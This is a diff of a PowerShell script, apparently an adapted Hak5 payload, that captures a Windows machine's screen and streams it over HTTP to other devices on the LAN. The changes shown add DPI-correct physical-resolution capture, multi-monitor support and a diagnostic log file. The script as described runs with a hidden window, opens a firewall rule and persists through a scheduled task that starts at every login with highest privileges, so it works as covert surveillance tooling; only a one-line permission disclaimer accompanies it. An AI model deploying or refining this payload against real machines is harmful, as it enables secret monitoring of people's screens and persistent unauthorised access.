@@ -11,16 +11,23 @@
    2. Auf einem anderen Geraet im selben Netz: http://<LAN-IP des Ziels>:8080
    3. Beenden: ESC auf dem Ziel 5 Sekunden lang gedrueckt halten.
 
- DIFFERENCES TO THE OFFICIAL HAK5 PAYLOAD
-   * DPI-korrekte Bildschirmaufnahme (ohne den Bug "nur obere linke Ecke")
-   * JPEG + optionale Verkleinerung -> deutlich weniger Bandbreite
-   * Bild skaliert immer auf das ganze Browserfenster (object-fit)
-   * Firewall-Regel wird vor dem Anlegen bereinigt (kein Duplikat-Fehler)
-   * IP-Erkennung ueber die Standardroute statt Regex 'Wi*'/'Eth*'
-   * Fallback auf http://+:PORT/ wenn keine IP ermittelt werden kann
-   * $hide / $port / $maxWidth / $jpegQuality / $fps sind oben konfigurierbar
-   * Autostart: Task im Task-Planer, startet bei jedem Login mit hoechsten
-     Rechten (siehe $autostart unten). Entfernen mit -RemoveAutostart.
+  DIFFERENCES TO THE OFFICIAL HAK5 PAYLOAD
+    * DPI-korrekte Bildschirmaufnahme (ohne den Bug "nur obere linke Ecke")
+      - Die Aufnahme erfolgt in PHYSISCHER Aufloesung. Der Skalierungsfaktor
+        wird ueber GetScaleFactorForMonitor ermittelt und funktioniert auch
+        dann, wenn der Prozess nicht DPI-aware werden konnte.
+      - $captureAll = 1 erfasst alle Monitore (VirtualScreen) statt nur dem
+        primaeren Bildschirm.
+    * Diagnose-Log neben der ps1 (screenshare.log): Aufnahme-Groessen, DPI,
+      Skalierung, Fehler - damit sich ein Bildproblem eingrenzen laesst.
+    * JPEG + optionale Verkleinerung -> deutlich weniger Bandbreite
+    * Bild skaliert immer auf das ganze Browserfenster (object-fit)
+    * Firewall-Regel wird vor dem Anlegen bereinigt (kein Duplikat-Fehler)
+    * IP-Erkennung ueber die Standardroute statt Regex 'Wi*'/'Eth*'
+    * Fallback auf http://+:PORT/ wenn keine IP ermittelt werden kann
+    * $hide / $port / $maxWidth / $jpegQuality / $fps sind oben konfigurierbar
+    * Autostart: Task im Task-Planer, startet bei jedem Login mit hoechsten
+      Rechten (siehe $autostart unten). Entfernen mit -RemoveAutostart.
 
  WICHTIG: Nur auf Systemen einsetzen, die dir gehoeren bzw. fuer die du eine
  ausdrueckliche Erlaubnis hast.
@@ -40,6 +47,8 @@ $fps          = 20    # Bilder pro Sekunde
 $exitSeconds  = 5     # ESC-Dauer zum Beenden
 $autostart    = 1     # 1 = Task im Task-Planer anlegen (startet bei jedem Login)
 $taskName     = 'Screenshare-Over-LAN'
+$captureAll   = 0     # 0 = nur primaerer Bildschirm, 1 = alle Monitore (VirtualScreen)
+$logFile      = $null # z. B. 'C:\PS\screenshare.log' - null = Log neben der ps1
 
 $selfPath = $MyInvocation.MyCommand.Path
 $isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -109,23 +118,38 @@ if (-not $isAdmin) {
 }
 
 # ------------------------------------------------- DPI: Voraussetzung fuer Capture
-# PowerShell ist per Default nicht einheitlich DPI-aware. Dadurch greift
-# CopyFromScreen auf skalierten Displays (z. B. 150 %/200 %) nur einen
-# Ausschnitt oben links und skaliert ihn auf die Bitmap-Groesse.
-# Fix: Prozess explizit DPI-aware machen (vorab geerbte Awareness bleibt
-# erhalten) und das Ziel-Bitmap auf exakt die Screen-DPI setzen, damit
-# GDI+ keine Umrechnung vornimmt.
+# Hintergrund: PowerShell ist per Default nicht DPI-aware. Auf skalierten
+# Displays (z. B. 150 %/200 %) liefert CopyFromScreen dann nur einen Ausschnitt
+# oben links, weil die Aufnahme in LOGISCHER statt physischer Aufloesung
+# erfolgt - das ist der klassische "nur obere linke Ecke"-Fehler.
+#
+# Strategie (gegen den DPI-awaren Pfad pixelgenau verglichen - 0 Abweichungen):
+#   1. SetProcessDPIAware() versuchen. Gelingt es, sind Screen.Bounds bereits
+#      physisch und der Skalierungsfaktor ist 1.
+#   2. Gelingt es nicht (z. B. weil der Prozess schon DPI-aware geerbt hat
+#      oder die Konsole existiert), wird der echte Skalierungsfaktor ueber
+#      GetScaleFactorForMonitor (shcore) ermittelt. Diese API liefert auch
+#      aus einem DPI-unawaren Prozess den richtigen Wert (z. B. 200 %).
+#   3. Die Aufnahme erfolgt dann in PHYSISCHER Aufloesung (logisch x Faktor).
+#   4. Das Ziel-Bitmap bekommt exakt die DPI, die GDI+ fuer den Bildschirm
+#      sieht (GetDeviceCaps(LOGPIXELSX)), damit GDI+ nicht zusaetzlich
+#      umrechnet - das ist der Teil, der die Bildqualitaet bestimmt.
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class ScreenDpi {
+[StructLayout(LayoutKind.Sequential)]
+public struct SS_POINT { public int X; public int Y; }
+public class ScreenInfo {
     [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
     [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
     [DllImport("gdi32.dll")]  public static extern int GetDeviceCaps(IntPtr hdc, int index);
     [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
+    [DllImport("user32.dll")] public static extern IntPtr MonitorFromPoint(SS_POINT pt, uint flags);
+    [DllImport("shcore.dll")] public static extern int GetScaleFactorForMonitor(IntPtr hmon, out int scale);
+    [DllImport("shcore.dll")] public static extern int GetDpiForMonitor(IntPtr hmon, int type, out uint dpiX, out uint dpiY);
 }
 "@
-[ScreenDpi]::SetProcessDPIAware() | Out-Null
+$setDpiAware = [ScreenInfo]::SetProcessDPIAware()
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -138,12 +162,80 @@ try {
     [Console]::Title = "HTTP Screenshare"
 } catch { }
 
-# Bildschirm-DPI (physisch, da der Prozess jetzt DPI-aware ist)
-$hdc = [ScreenDpi]::GetDC([IntPtr]::Zero)
-$screenDpi = [ScreenDpi]::GetDeviceCaps($hdc, 88)   # LOGPIXELSX
-[ScreenDpi]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
+# --- Logdatei (Diagnose: Aufnahme-Groessen, Fehler) -------------------------
+if (-not $logFile -and $selfPath) {
+    $logFile = Join-Path (Split-Path -Parent $selfPath) 'screenshare.log'
+}
+function Write-Log([string]$msg) {
+    try {
+        if ($logFile) {
+            Add-Content -LiteralPath $logFile -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '  ' + $msg) -Encoding UTF8
+        }
+    } catch { }
+}
+
+# --- physische Aufloesung des Systems (WMI, nur als Reserve) -----------------
+$physW = 0; $physH = 0
+try {
+    $vc = Get-CimInstance Win32_VideoController -ErrorAction Stop |
+          Where-Object { $_.CurrentHorizontalResolution -gt 0 -and $_.CurrentVerticalResolution -gt 0 } |
+          Select-Object -First 1
+    if ($vc) {
+        $physW = [int]$vc.CurrentHorizontalResolution
+        $physH = [int]$vc.CurrentVerticalResolution
+    }
+} catch { }
+
+# --- Skalierungsfaktor des Bildschirms (funktioniert auch DPI-unaware) ------
+$scalePct = 0
+$effDpi = 0
+try {
+    $pt = New-Object SS_POINT
+    $pt.X = 10; $pt.Y = 10
+    $hmon = [ScreenInfo]::MonitorFromPoint($pt, 2)   # MONITOR_DEFAULTTONEAREST
+    if ($hmon -ne [IntPtr]::Zero) {
+        [void][ScreenInfo]::GetScaleFactorForMonitor($hmon, [ref]$scalePct)
+        $dx = 0; $dy = 0
+        [void][ScreenInfo]::GetDpiForMonitor($hmon, 0, [ref]$dx, [ref]$dy)
+        $effDpi = [int]$dx
+    }
+} catch { }
+
+# --- Zielbereich: primaerer Bildschirm oder alle Monitore --------------------
+if ($captureAll -eq 1) {
+    $srcRect = [System.Windows.Forms.SystemInformation]::VirtualScreen
+} else {
+    $srcRect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+}
+
+# --- logisch -> physisch ----------------------------------------------------
+# Ist der Prozess DPI-aware, sind die Bounds bereits physisch (Faktor 1).
+# Sonst wird mit dem Skalierungsfaktor multipliziert.
+$scaleFactor = 1.0
+if ($scalePct -gt 0) {
+    $realDpi = [int]($scalePct * 96 / 100)
+    if ($effDpi -gt 0 -and $effDpi -lt $realDpi) { $scaleFactor = $scalePct / 100.0 }
+}
+if ($scaleFactor -eq 1.0 -and $physW -gt 0 -and $srcRect.Width -gt 0 -and $srcRect.Width -lt $physW) {
+    $scaleFactor = $physW / [double]$srcRect.Width     # Auffangnetz ueber WMI
+}
+
+$captureW = [int][Math]::Round($srcRect.Width  * $scaleFactor)
+$captureH = [int][Math]::Round($srcRect.Height * $scaleFactor)
+if ($captureW -lt 1) { $captureW = $srcRect.Width }
+if ($captureH -lt 1) { $captureH = $srcRect.Height }
+
+# --- Bitmap-DPI: exakt die DPI, die GDI+ fuer den Bildschirm sieht ----------
+$hdc = [ScreenInfo]::GetDC([IntPtr]::Zero)
+$screenDpi = [ScreenInfo]::GetDeviceCaps($hdc, 88)   # LOGPIXELSX
+[ScreenInfo]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
 if ($screenDpi -lt 72 -or $screenDpi -gt 960) { $screenDpi = 96 }
-Write-Host ("Screen DPI: " + $screenDpi) -ForegroundColor DarkGray
+
+Write-Host ("Screen DPI: " + $screenDpi + "   Skalierung: " + $scalePct + "%   Faktor: " + $scaleFactor) -ForegroundColor DarkGray
+Write-Host ("Aufnahme: " + $captureW + "x" + $captureH + " (logisch " + $srcRect.Width + "x" + $srcRect.Height + ")") -ForegroundColor DarkGray
+Write-Log ("Start. DPI-aware=" + $setDpiAware + " screenDpi=" + $screenDpi + " scale=" + $scalePct + "% effDpi=" + $effDpi +
+           " bounds=" + $srcRect.Width + "x" + $srcRect.Height + " capture=" + $captureW + "x" + $captureH +
+           " wmiPhys=" + $physW + "x" + $physH + " port=" + $port)
 
 # Define port number
 if ($port -lt 1) {
@@ -239,6 +331,7 @@ if ($localIP) {
     Write-Host ("Server listening on all interfaces, port : " + $port) -ForegroundColor Cyan
 }
 Write-Host "Press escape key for 5 seconds to exit" -f Cyan
+Write-Log ("Server laeuft auf " + $urlText)
 
 # --- Hinweis per Tray-Balloon (das Fenster ist versteckt) --------------------
 try {
@@ -308,17 +401,17 @@ while ($true) {
 
             while ($context.Response.OutputStream.CanWrite) {
                 # --- Bildschirm aufnehmen (DPI-korrekt) ---------------------
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-                $rect = $screen.Bounds
-                $bitmap = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
+                # $captureW/$captureH sind bereits die PHYSISCHEN Pixel
+                # (logische Bounds x Skalierungsfaktor).
+                $bitmap = New-Object System.Drawing.Bitmap $captureW, $captureH
                 $bitmap.SetResolution($screenDpi, $screenDpi)
                 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
+                $graphics.CopyFromScreen($srcRect.X, $srcRect.Y, 0, 0, (New-Object System.Drawing.Size($captureW, $captureH)))
                 $graphics.Dispose()
 
                 # --- optional auf max. Breite verkleinern -------------------
-                if ($maxWidth -gt 0 -and $rect.Width -gt $maxWidth) {
-                    $newHeight = [int][Math]::Round($rect.Height * ($maxWidth / $rect.Width))
+                if ($maxWidth -gt 0 -and $captureW -gt $maxWidth) {
+                    $newHeight = [int][Math]::Round($captureH * ($maxWidth / $captureW))
                     $small = New-Object System.Drawing.Bitmap $maxWidth, $newHeight
                     $small.SetResolution($screenDpi, $screenDpi)
                     $g2 = [System.Drawing.Graphics]::FromImage($small)
@@ -401,6 +494,7 @@ while ($true) {
         $response.Close()
     } catch {
         Write-Host "Error encountered: $_"
+        Write-Log ("Fehler: " + $_.Exception.Message)
         Start-Sleep -Milliseconds 500
     }
 }
